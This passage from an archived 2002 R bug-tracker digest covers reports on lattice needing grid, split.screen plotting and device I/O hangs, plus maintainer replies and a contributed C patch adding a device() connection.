Beautiful -- all the ticks have an appropriate length, tcl == +5!

Why?


-------------- == --------------
    R> version
    _
    platform i386-pc-linux-gnu
    arch     i386
    os       linux-gnu
    system   i386, linux-gnu
    status
    major    1
    minor    5.1

-------------- == --------------


With best regards,
Timur V. Elzhov



==> 1933.audit <==
Sun Aug 25 11:54:31 2002	ripley	changed notes
Sun Aug 25 11:54:31 2002	ripley	foobar
Sun Aug 25 11:54:31 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1972 *
Subject: lattice install
From: robert.king@newcastle.edu.au
Date: Mon, 2 Sep 2002 04:55:41 +0200 (MET DST)
--Perhaps lattice should require(grid) and print a clearer message?
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1972 <==
From robert.king@newcastle.edu.au  Mon Sep  2 04:55:43 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id EAA26744
	for <R-bugs@biostat.ku.dk>; Mon, 2 Sep 2002 04:55:41 +0200 (MET DST)
Date: Mon, 2 Sep 2002 04:55:41 +0200 (MET DST)
From: robert.king@newcastle.edu.au
Message-Id: <200209020255.EAA26744@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: lattice install

Full_Name: Robert King
Version: 1.3
OS: windows
Submission from: (NULL) (134.148.4.19)


This looks like a problem with package dependencies.  Should be sending this to
the 
package author, not r-bugs?


An attempt to install lattice from the windows binary runs OK, but attempting to
load the library an error occurs:

> install.packages("D:/Software/R/lattice.zip", .lib.loc[1], CRAN = NULL)
updating HTML package descriptions
> library(lattice)
Error in parse(file, n, text, prompt) : syntax error on line 2022

I then tried installing under linux with R 1.5.1

This installed OK, but loading the library gave another error:

> library(lattice)
Error in library(grid) : There is no package called `grid'

Installing grid on linux resulted in lattice loading and working properly

Installing grid also fixed the problem on windows.



==> 1972.audit <==
Tue Sep  3 19:47:36 2002	thomas	changed notes
Tue Sep  3 19:47:36 2002	thomas	foobar
Tue Sep  3 19:47:36 2002	thomas	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2069 *
Subject: split.screen problem
From: cbodily@att.net
Date: Thu, 26 Sep 2002 19:37:40 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2069 <==
From cbodily@att.net  Thu Sep 26 19:37:41 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA21297
	for <R-bugs@biostat.ku.dk>; Thu, 26 Sep 2002 19:37:40 +0200 (MET DST)
Date: Thu, 26 Sep 2002 19:37:40 +0200 (MET DST)
From: cbodily@att.net
Message-Id: <200209261737.TAA21297@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: split.screen problem

Full_Name: Chris Bodily
Version: 1.5.1
OS: W2K
Submission from: (NULL) (63.106.106.2)


I took the following code directly from the 'split.screen' help page in R and
modified one line to highlight the problem I encountered.  Basically, it appears
that when plotting in split screens and attempting to return to a particular
screen to add or update points, the axes from the original plot are not
remembered, causing the new points to plot incorrectly.
 
A workaround seem to be storing the original plot range and issuing
'plot(x,y,type="n")' where x and y are data vectors with ranges that match the
original plot in the screen of interest.  Then a 'points' command draws in the
correct locations.
 
I found this by moving working code from S-Plus 2000 into R v1.5.1 and noticed
that a particular interactive plot I use began drawing incorrectly.
 
Thanks,
 
Chris Bodily
 
#--------------------------------------------------------------------------------------
 
 
   if (interactive()) {
     par(bg = "white")           # default is likely to be transparent
 
     split.screen(c(2,1))        # split display into two screens
     split.screen(c(1,2),2)      # split bottom half in two
 
     plot(1:10)                  # screen 3 is active, draw plot
     erase.screen()              # forgot label, erase and redraw
     plot(1:10, ylab= "ylab 3")
 
     screen(1)                   # prepare screen 1 for output
     plot(1:10)
 
     screen(4)                   # prepare screen 4 for output
     plot(1:10, ylab="ylab 4")
 
     screen(1, FALSE)            # return to screen 1, but do not clear
#     plot(10:1,axes=FALSE, pch=2,col=5, lty=2, ylab="")  # overlay second plot

## Problem here as the following points get plotted incorrectly ##
## it seems that the axes are reset                             ##
     points(rep(3,10),1:10,col=2,pch=2)  # add a few more points for a test
 
     axis(4)                     # add tic marks to right-hand axis
     title("Plot 1")
     close.screen(all = TRUE)    # exit split-screen mode
     }


==> 2069.audit <==
Tue Oct  1 00:20:40 2002	thomas	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  In-Out

* PR# 1688 *
Subject: Maybe a problem in binary read/write
From: accot@free.fr
Date: Tue, 18 Jun 2002 22:51:17 +0200 (MET DST)
--I don't think file() is said to work with devices!
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1688 <==
From accot@free.fr  Tue Jun 18 22:51:17 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA26479
	for <R-bugs@biostat.ku.dk>; Tue, 18 Jun 2002 22:51:17 +0200 (MET DST)
Date: Tue, 18 Jun 2002 22:51:17 +0200 (MET DST)
From: accot@free.fr
Message-Id: <200206182051.WAA26479@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Maybe a problem in binary read/write

Full_Name: Johnny Accot
Version: 1.5.1
OS: Linux
Submission from: (NULL) (198.4.83.52)


Hi.

I'm having a problem with the binary read/write functions.  I'm writing a device
driver in R (why not?) and of course I have to send a couple commands to the
device.  Typically, I send one byte, receive one acknowledgement byte, send
another byte, receive an ACK, and so on.  At least this is what I would like to
do.  Instead, after writing one byte, reading its acknowledgement byte, and
writing a second byte, R hangs on the next read for an unknown reason.  I guess
this is a bug in the read/write functions.  If you have a PS/2 device you may
try to run the following code:

ascii <- sapply(1:255, function(i)
parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
dev <- file("/dev/psaux")
open(dev, "w+b")
writeChar(ascii[246], dev, eos=NULL)
readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
writeChar(ascii[246], dev, eos=NULL)
readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
close(dev)

which gives:

> ascii <- sapply(1:255, function(i)
parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> dev <- file("/dev/psaux")
> open(dev, "w+b")
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
[1] 250
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
[...R hangs here...]

It first creates an ascii table, opens the PS/2 device for binary read&write,
writes the byte 0xF6 (246 in decimal, which means: set default; it is harmless),
reads the acknowledgement byte 0xFA (250 in decimal), writes another 0xF6, and
then hangs when reading the second acknowledgement byte.  If, instead, you close
the device between the two writes, it's fine:

> ascii <- sapply(1:255, function(i)
parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> 
> dev <- file("/dev/psaux", "w+b")
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
[1] 250
> close(dev)
> 
> dev <- file("/dev/psaux", "w+b")
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
[1] 250
> close(dev)

This is not a feature, is it? :-)  The behavior is the same in versions 1.4.1,
1.5.0 and 1.5.1 on my computer.  I don't have to send bytes very often, so I'll
stick with the open-each-time strategy, but it is not very clean.

I also tried to write bytes using the writeBin command, but it says the "size=1"
is not available on my computer.  This is why I'm using the writeChar function.

Please let me know if I'm doing something wrong.  I hope not.

And thanks for the great software! :-)

Johnny

PS: if you try to run the code and don't get 250 as acknowledgement byte, it
means the PS/2 controller is not in idle state.  Very unlikely though.  Try
again as the set-default command should bring it back to its idle state.

==> 1688.audit <==
Wed Jun 19 11:08:36 2002	ripley	changed notes
Wed Jun 19 11:08:36 2002	ripley	foobar
Wed Jun 19 11:08:36 2002	ripley	moved from incoming to In-Out

==> 1688.followup.1 <==
From ripley@stats.ox.ac.uk  Wed Jun 19 11:15:35 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA29635
	for <R-bugs@biostat.ku.dk>; Wed, 19 Jun 2002 11:15:34 +0200 (MET DST)
Received: from auk.stats (pc1-oxfd1-4-cust16.oxf.cable.ntl.com [62.254.131.16])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id KAA04893;
	Wed, 19 Jun 2002 10:14:51 +0100 (BST)
Date: Wed, 19 Jun 2002 10:13:45 +0100 (BST)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Sender: ripley@auk.stats
To: accot@free.fr
cc: R-bugs@biostat.ku.dk
Subject: Re: Maybe a problem in binary read/write (PR#1688)
In-Reply-To: <200206182051.WAA26484@pubhealth.ku.dk>
Message-ID: <Pine.GSO.4.44.0206191008210.21134-100000@auk.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

Not a bug: check the documentation of file(), which is documented to work
for files but not for devices.  No attempt is made to cope with e.g.
blocking on non-files.

It's a pretty extreme view of the world to consider /dev/psaux to be a
file, and R is just using standard C <stdio.h> I/O.

However, this is a great opportunity for you to contribute a device()
function to R.

On Tue, 18 Jun 2002 accot@free.fr wrote:

> Full_Name: Johnny Accot
> Version: 1.5.1
> OS: Linux
> Submission from: (NULL) (198.4.83.52)
>
>
> Hi.
>
> I'm having a problem with the binary read/write functions.  I'm writing a device
> driver in R (why not?) and of course I have to send a couple commands to the
> device.  Typically, I send one byte, receive one acknowledgement byte, send
> another byte, receive an ACK, and so on.  At least this is what I would like to
> do.  Instead, after writing one byte, reading its acknowledgement byte, and
> writing a second byte, R hangs on the next read for an unknown reason.  I guess
> this is a bug in the read/write functions.  If you have a PS/2 device you may
> try to run the following code:
>
> ascii <- sapply(1:255, function(i)
> parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> dev <- file("/dev/psaux")
> open(dev, "w+b")
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> writeChar(ascii[246], dev, eos=NULL)
> readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> close(dev)
>
> which gives:
>
> > ascii <- sapply(1:255, function(i)
> parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> > dev <- file("/dev/psaux")
> > open(dev, "w+b")
> > writeChar(ascii[246], dev, eos=NULL)
> > readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> [1] 250
> > writeChar(ascii[246], dev, eos=NULL)
> > readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> [...R hangs here...]
>
> It first creates an ascii table, opens the PS/2 device for binary read&write,
> writes the byte 0xF6 (246 in decimal, which means: set default; it is harmless),
> reads the acknowledgement byte 0xFA (250 in decimal), writes another 0xF6, and
> then hangs when reading the second acknowledgement byte.  If, instead, you close
> the device between the two writes, it's fine:
>
> > ascii <- sapply(1:255, function(i)
> parse(text=paste("\"\\",structure(i,class="octmode"),"\"",sep=""))[[1]])
> >
> > dev <- file("/dev/psaux", "w+b")
> > writeChar(ascii[246], dev, eos=NULL)
> > readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> [1] 250
> > close(dev)
> >
> > dev <- file("/dev/psaux", "w+b")
> > writeChar(ascii[246], dev, eos=NULL)
> > readBin(dev, what=integer(), n=1, size=1, signed=FALSE)
> [1] 250
> > close(dev)
>
> This is not a feature, is it? :-)  The behavior is the same in versions 1.4.1,
> 1.5.0 and 1.5.1 on my computer.  I don't have to send bytes very often, so I'll
> stick with the open-each-time strategy, but it is not very clean.
>
> I also tried to write bytes using the writeBin command, but it says the "size=1"
> is not available on my computer.  This is why I'm using the writeChar function.
>
> Please let me know if I'm doing something wrong.  I hope not.
>
> And thanks for the great software! :-)
>
> Johnny
>
> PS: if you try to run the code and don't get 250 as acknowledgement byte, it
> means the PS/2 controller is not in idle state.  Very unlikely though.  Try
> again as the set-default command should bring it back to its idle state.
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1688.followup.2 <==
From accot@free.fr  Thu Jun 20 20:07:49 2002
Received: from mailhub2.almaden.ibm.com (p1.almaden.ibm.com [198.4.83.52])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA15261
	for <R-bugs@biostat.ku.dk>; Thu, 20 Jun 2002 20:07:47 +0200 (MET DST)
Received: from free.fr (dhcp10136.almaden.ibm.com [9.1.10.136])
	by mailhub2.almaden.ibm.com (AIX4.3/8.9.3/8.9.3) with ESMTP id LAA22084;
	Thu, 20 Jun 2002 11:06:01 -0700
Message-ID: <3D121989.509@free.fr>
Date: Thu, 20 Jun 2002 11:06:01 -0700
From: Johnny Accot <accot@free.fr>
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1a) Gecko/20020610
X-Accept-Language: en-us, fr, en
MIME-Version: 1.0
To: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
CC: R-bugs@biostat.ku.dk
Subject: Re: Maybe a problem in binary read/write (PR#1688)
References: <Pine.GSO.4.44.0206191008210.21134-100000@auk.stats>
Content-Type: multipart/mixed;
 boundary="------------010901020707080002040305"

This is a multi-part message in MIME format.
--------------010901020707080002040305
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hello,

Prof Brian D Ripley wrote:
> Not a bug: check the documentation of file(), which is documented to work
> for files but not for devices.  No attempt is made to cope with e.g.
> blocking on non-files.
> 
> It's a pretty extreme view of the world to consider /dev/psaux to be a
> file, and R is just using standard C <stdio.h> I/O.
> 
> However, this is a great opportunity for you to contribute a device()
> function to R.

I finally checked the code and "wrote" the functions to "handle devices".
Well, in fact I more or less duplicated the code for FIFOs, removed the
option for encoding, added an option for synchronous I/O, and added a
test to check that the file is indeed a character or block special file.
This works great for me but I'm afraid it is a bit simple and does not
cover much of device handling in general.  Especially I don't know if
anybody would want to use it for block devices, and what they would need.
The psaux device is one of the simplest device one could think of, that's
why it works so well.  For other devices one would need at least an
ioctl function, which I didn't write.  But still I have no idea whether
anybody would use it and what for.  Anyway.  Please let me know if you
think this is useful.  If yes, I will try to familiarize myself with
the structure of the R code and make the device handling more general.

Thanks,
Johnny

--------------010901020707080002040305
Content-Type: text/plain;
 name="R-1.5.1-device.patch"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="R-1.5.1-device.patch"

diff -ur R-1.5.1.orig/configure R-1.5.1/configure
--- R-1.5.1.orig/configure	2002-06-17 04:20:30.000000000 -0700
+++ R-1.5.1/configure	2002-06-19 19:33:22.000000000 -0700
@@ -17238,8 +17238,9 @@
 
 
 
+
 for ac_func in access chdir expm1 fcntl finite ftruncate getcwd \
-  getgrgid getpwuid getuid hypot isascii isnan log1p matherr mkfifo \
+  getgrgid getpwuid getuid hypot isascii isnan log1p matherr mkfifo mknod \
   popen putenv rint setenv strcoll stat strptime system times unsetenv
 do
 as_ac_var=`echo "ac_cv_func_$ac_func" | $as_tr_sh`
diff -ur R-1.5.1.orig/configure.ac R-1.5.1/configure.ac
--- R-1.5.1.orig/configure.ac	2002-04-30 11:04:05.000000000 -0700
+++ R-1.5.1/configure.ac	2002-06-19 19:25:04.000000000 -0700
@@ -982,7 +982,7 @@
 
 AC_FUNC_ALLOCA
 AC_CHECK_FUNCS(access chdir expm1 fcntl finite ftruncate getcwd \
-  getgrgid getpwuid getuid hypot isascii isnan log1p matherr mkfifo \
+  getgrgid getpwuid getuid hypot isascii isnan log1p matherr mkfifo mknod \
   popen putenv rint setenv strcoll stat strptime system times unsetenv)
 ## <NOTE>
 ## No need checking for bcopy bzero memcpy mempcpy even though ifnames
diff -ur R-1.5.1.orig/src/include/config.h.in R-1.5.1/src/include/config.h.in
--- R-1.5.1.orig/src/include/config.h.in	2002-04-24 02:54:05.000000000 -0700
+++ R-1.5.1/src/include/config.h.in	2002-06-19 19:35:10.000000000 -0700
@@ -216,6 +216,9 @@
 /* Define to 1 if you have the `mkfifo' function. */
 #undef HAVE_MKFIFO
 
+/* Define to 1 if you have the `mknod' function. */
+#undef HAVE_MKNOD
+
 /* Define to 1 if you have the <ndir.h> header file, and it defines `DIR'. */
 #undef HAVE_NDIR_H
 
diff -ur R-1.5.1.orig/src/include/Internal.h R-1.5.1/src/include/Internal.h
--- R-1.5.1.orig/src/include/Internal.h	2002-04-03 22:51:04.000000000 -0800
+++ R-1.5.1/src/include/Internal.h	2002-06-19 19:25:06.000000000 -0700
@@ -439,6 +439,7 @@
 SEXP do_isseekable(SEXP, SEXP, SEXP, SEXP);
 SEXP do_close(SEXP, SEXP, SEXP, SEXP);
 SEXP do_fifo(SEXP, SEXP, SEXP, SEXP);
+SEXP do_device(SEXP, SEXP, SEXP, SEXP);
 SEXP do_pipe(SEXP, SEXP, SEXP, SEXP);
 SEXP do_url(SEXP, SEXP, SEXP, SEXP);
 SEXP do_gzfile(SEXP, SEXP, SEXP, SEXP);
diff -ur R-1.5.1.orig/src/include/Rconnections.h R-1.5.1/src/include/Rconnections.h
--- R-1.5.1.orig/src/include/Rconnections.h	2002-03-10 05:20:42.000000000 -0800
+++ R-1.5.1/src/include/Rconnections.h	2002-06-19 20:09:26.000000000 -0700
@@ -28,7 +28,7 @@
     char* class;
     char* description;
     char mode[5];
-    Rboolean text, isopen, incomplete, canread, canwrite, canseek, blocking;
+    Rboolean text, isopen, incomplete, canread, canwrite, canseek, blocking, sync;
     Rboolean (*open)(struct Rconn *);
     void (*close)(struct Rconn *); /* routine closing after auto open */
     void (*destroy)(struct Rconn *); /* when closing connection */
@@ -58,6 +58,10 @@
     int fd;
 } *Rfifoconn;
 
+typedef struct deviceconn {
+    int fd;
+} *Rdeviceconn;
+
 typedef struct gzfileconn {
     void *fp;
     int cp;
diff -ur R-1.5.1.orig/src/library/base/man/connections.Rd R-1.5.1/src/library/base/man/connections.Rd
--- R-1.5.1.orig/src/library/base/man/connections.Rd	2002-03-10 05:20:42.000000000 -0800
+++ R-1.5.1/src/library/base/man/connections.Rd	2002-06-20 10:48:13.000000000 -0700
@@ -4,6 +4,7 @@
 \alias{file}
 \alias{pipe}
 \alias{fifo}
+\alias{device}
 \alias{gzfile}
 \alias{unz}
 \alias{bzfile}
@@ -31,6 +32,7 @@
 pipe(description, open = "", encoding = getOption("encoding"))
 fifo(description = "", open = "", blocking = FALSE,
      encoding = getOption("encoding"))
+device(description = "", open = "", blocking = TRUE, sync = TRUE)
 gzfile(description, open = "", encoding = getOption("encoding"),
        compression = 6)
 unz(description, filename, open = "", encoding = getOption("encoding"))
@@ -62,6 +64,7 @@
   \item{open}{character.  A description of how to open the connection
     (if at all). See Details for possible values.}
   \item{blocking}{logical.  See `Blocking' section below.}
+  \item{sync}{logical.  Should the device be opened for synchronous I/O?}
   \item{encoding}{An integer vector of length 256.}
   \item{compression}{integer in 0--9.  The amount of compression to be
     applied when writing, from none to maximal.  The default is a good
@@ -74,7 +77,7 @@
   \item{\dots}{arguments passed to or from other methods.}
 }
 \details{
-  The first eight functions create connections.  By default the
+  The first nine functions create connections.  By default the
   connection is not opened (except for \code{socketConnection}), but may
   be opened by setting a non-empty value of argument \code{open}.
 
@@ -135,8 +138,8 @@
   characters are mapped to a space in these encodings.
 }
 \value{
-  \code{file}, \code{pipe}, \code{fifo}, \code{url}, \code{gzfile} and
-  \code{socketConnection} return a connection object
+  \code{file}, \code{pipe}, \code{fifo}, \code{device}, \code{url},
+  \code{gzfile} and \code{socketConnection} return a connection object
   which inherits from class \code{"connection"} and has a first more
   specific class.
 
diff -ur R-1.5.1.orig/src/main/connections.c R-1.5.1/src/main/connections.c
--- R-1.5.1.orig/src/main/connections.c	2002-04-30 04:04:02.000000000 -0700
+++ R-1.5.1/src/main/connections.c	2002-06-19 20:12:34.000000000 -0700
@@ -640,6 +640,181 @@
 #endif
 }
 
+/* ------------------- device connections --------------------- */
+
+#if defined(HAVE_MKNOD) && defined(HAVE_FCNTL_H)
+
+#ifdef HAVE_STAT
+# ifndef Macintosh
+#  ifdef HAVE_SYS_TYPES_H
+#   include <sys/types.h>
+#  endif
+#  ifdef HAVE_SYS_STAT_H
+#   include <sys/stat.h>
+#  endif
+# else /* Macintosh */
+#  include <types.h>
+#  ifndef __MRC__
+#   include <stat.h>
+#  else
+#   include <mpw_stat.h>
+#  endif
+# endif /* Macintosh */
+#endif /* HAVE_STAT */
+
+#ifdef HAVE_ERRNO_H
+# include <errno.h>
+#endif
+
+static Rboolean device_open(Rconnection con)
+{
+    char *name;
+    Rdeviceconn this = con->private;
+    int fd, flags, res;
+    int mlen = strlen(con->mode);
+    struct stat sb;
+
+    name = R_ExpandFileName(con->description);
+    con->canwrite = (con->mode[0] == 'w' || con->mode[0] == 'a');
+    con->canread = !con->canwrite;
+    if(mlen >= 2 && con->mode[1] == '+') con->canread = TRUE;
+
+    /* check if the device exists and if it is a character or block device */
+    if(con->canwrite) {
+	res = stat(name, &sb);
+	if(res) { /* error, does not exist? */
+	    if(errno == ENOENT) warning("device `%s' does not exist", name);
+	    else warning("cannot find device `%s'", name);
+	    return FALSE;
+	} else {
+	    if(!(sb.st_mode & S_IFCHR) && !(sb.st_mode & S_IFBLK)) {
+		warning("`%s' exists but is neither a character special file nor a block special file", name);
+		return FALSE;
+	    }
+	}
+    }
+
+    if(con->canread && con->canwrite) flags = O_RDWR;
+    else if(con->canread) flags = O_RDONLY;
+    else flags = O_WRONLY;
+    if(!con->blocking) flags |= O_NONBLOCK;
+    if(con->sync) flags |= O_SYNC;
+    if(con->mode[0] == 'a') flags |= O_APPEND;
+    fd = open(name, flags);
+    if(fd < 0) {
+	if(errno == ENXIO) warning("device `%s' is not ready", name);
+	else warning("cannot open device `%s'", name);
+	return FALSE;
+    }
+    
+    this->fd = fd;
+    con->isopen = TRUE;
+
+    if(mlen >= 2 && con->mode[mlen-1] == 'b') con->text = FALSE;
+    else con->text = TRUE;
+    con->save = -1000;
+    return TRUE;
+}
+
+static int device_fgetc(Rconnection con)
+{
+    Rdeviceconn this = (Rdeviceconn)con->private;
+    unsigned char c;
+    int n;
+  
+    n = read(this->fd, (char *)&c, 1);
+    return (n == 1) ? c : R_EOF;
+}
+
+static Rconnection newdevice(char *description, char *mode)
+{
+    Rconnection new;
+    new = (Rconnection) malloc(sizeof(struct Rconn));
+    if(!new) error("allocation of device connection failed");
+    new->class = (char *) malloc(strlen("device") + 1);
+    if(!new->class) {
+	free(new);
+	error("allocation of device connection failed");
+    }
+    strcpy(new->class, "device");
+    new->description = (char *) malloc(strlen(description) + 1);
+    if(!new->description) {
+	free(new->class); free(new);
+	error("allocation of device connection failed");
+    }
+    init_con(new, description, mode);
+    new->open = &device_open;
+    new->close = &fifo_close;
+    new->vfprintf = &dummy_vfprintf;
+    new->fgetc = &device_fgetc;
+    new->seek = &null_seek;
+    new->truncate = &null_truncate;
+    new->fflush = &null_fflush;
+    new->read = &fifo_read;
+    new->write = &fifo_write;
+    new->private = (void *) malloc(sizeof(struct deviceconn));
+    if(!new->private) {
+	free(new->description); free(new->class); free(new);
+	error("allocation of device connection failed");
+    }
+    return new;
+}
+#endif
+
+SEXP do_device(SEXP call, SEXP op, SEXP args, SEXP env)
+{
+#if defined(HAVE_MKNOD) && defined(HAVE_FCNTL_H)
+    SEXP sfile, sopen, ans, class;
+    char *file, *open;
+    int i, ncon, block, sync;
+    Rconnection con = NULL;
+
+    checkArity(op, args);
+    sfile = CAR(args);
+    if(!isString(sfile) || length(sfile) < 1)
+	errorcall(call, "invalid `description' argument");
+    if(length(sfile) > 1)
+	warning("only first element of `description' argument used");
+    file = CHAR(STRING_ELT(sfile, 0));
+    sopen = CADR(args);
+    if(!isString(sopen) || length(sopen) != 1)
+	error("invalid `open' argument");
+    block = asLogical(CADDR(args));
+    if(block == NA_LOGICAL)
+	error("invalid `block' argument");
+    sync = asLogical(CADDDR(args));
+    if(sync == NA_LOGICAL)
+	error("invalid `sync' argument");
+    open = CHAR(STRING_ELT(sopen, 0));
+    ncon = NextConnection();
+    con = Connections[ncon] = newdevice(file, strlen(open) ? open : "r");
+    con->blocking = block;
+    con->sync = sync;
+
+    /* open it if desired */
+    if(strlen(open)) {
+	Rboolean success = con->open(con);
+	if(!success) {
+	    con_close(ncon);
+	    error("unable to open connection");
+	}
+    }
+
+    PROTECT(ans = allocVector(INTSXP, 1));
+    INTEGER(ans)[0] = ncon;
+    PROTECT(class = allocVector(STRSXP, 2));
+    SET_STRING_ELT(class, 0, mkChar("device"));
+    SET_STRING_ELT(class, 1, mkChar("connection"));
+    classgets(ans, class);
+    UNPROTECT(2);
+
+    return ans;
+#else
+    error("device connections are not available on this system");
+    return R_NilValue;		/* -Wall */
+#endif
+}
+
 /* ------------------- pipe connections --------------------- */
 
 #ifdef HAVE_POPEN
diff -ur R-1.5.1.orig/src/main/names.c R-1.5.1/src/main/names.c
--- R-1.5.1.orig/src/main/names.c	2002-04-04 14:11:31.000000000 -0800
+++ R-1.5.1/src/main/names.c	2002-06-20 10:38:39.000000000 -0700
@@ -692,9 +692,6 @@
 {"dev.control",	do_devcontrol,	0,	111,	0,	PP_FUNCALL},
 {"dev.copy",	do_devcopy,	0,	111,	1,	PP_FUNCALL},
 {"dev.cur",	do_devcur,	0,	111,	0,	PP_FUNCALL},
-/*
-{"device",	do_device,	0,	111,	3,	PP_FUNCALL},
-*/
 {"dev.next",	do_devnext,	0,	111,	1,	PP_FUNCALL},
 {"dev.off",	do_devoff,	0,	111,	1,	PP_FUNCALL},
 {"dev.prev",	do_devprev,	0,	111,	1,	PP_FUNCALL},
@@ -793,6 +790,7 @@
 {"url", 	do_url,		0,      11,     4,      PP_FUNCALL},
 {"pipe", 	do_pipe,	0,      11,     3,      PP_FUNCALL},
 {"fifo", 	do_fifo,	0,      11,     4,      PP_FUNCALL},
+{"device", 	do_device,	0,      11,     4,      PP_FUNCALL},
 {"gzfile", 	do_gzfile,	0,      11,     4,      PP_FUNCALL},
 {"unz", 	do_unz,		0,      11,     3,      PP_FUNCALL},
 {"bzfile", 	do_bzfile,	0,      11,     3,      PP_FUNCALL},

--------------010901020707080002040305--


==> 1688.followup.3 <==
From ripley@stats.ox.ac.uk  Thu Jun 20 20:44:01 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA15376
	for <R-bugs@biostat.ku.dk>; Thu, 20 Jun 2002 20:44:01 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id TAA10803;
	Thu, 20 Jun 2002 19:43:18 +0100 (BST)
Date: Thu, 20 Jun 2002 19:43:18 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: Johnny Accot <accot@free.fr>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: Maybe a problem in binary read/write (PR#1688)
In-Reply-To: <3D121989.509@free.fr>
Message-ID: <Pine.LNX.4.31.0206201942270.9210-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 20 Jun 2002, Johnny Accot wrote:

> Hello,
>
> Prof Brian D Ripley wrote:
> > Not a bug: check the documentation of file(), which is documented to work
> > for files but not for devices.  No attempt is made to cope with e.g.
> > blocking on non-files.
> >
> > It's a pretty extreme view of the world to consider /dev/psaux to be a
> > file, and R is just using standard C <stdio.h> I/O.
> >
> > However, this is a great opportunity for you to contribute a device()
> > function to R.
>
> I finally checked the code and "wrote" the functions to "handle devices".
> Well, in fact I more or less duplicated the code for FIFOs, removed the
> option for encoding, added an option for synchronous I/O, and added a
> test to check that the file is indeed a character or block special file.
> This works great for me but I'm afraid it is a bit simple and does not
> cover much of device handling in general.  Especially I don't know if
> anybody would want to use it for block devices, and what they would need.
> The psaux device is one of the simplest device one could think of, that's
> why it works so well.  For other devices one would need at least an
> ioctl function, which I didn't write.  But still I have no idea whether
> anybody would use it and what for.  Anyway.  Please let me know if you
> think this is useful.  If yes, I will try to familiarize myself with
> the structure of the R code and make the device handling more general.

Yes, I do think it would be useful, but I know little about it,
Thank you for the offer.

>
> Thanks,
> Johnny
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Installation

* PR# 1222 *
Subject: configure: sed: Function s%@PDFLATEX@%/usr/local/bin/pdflatex%g
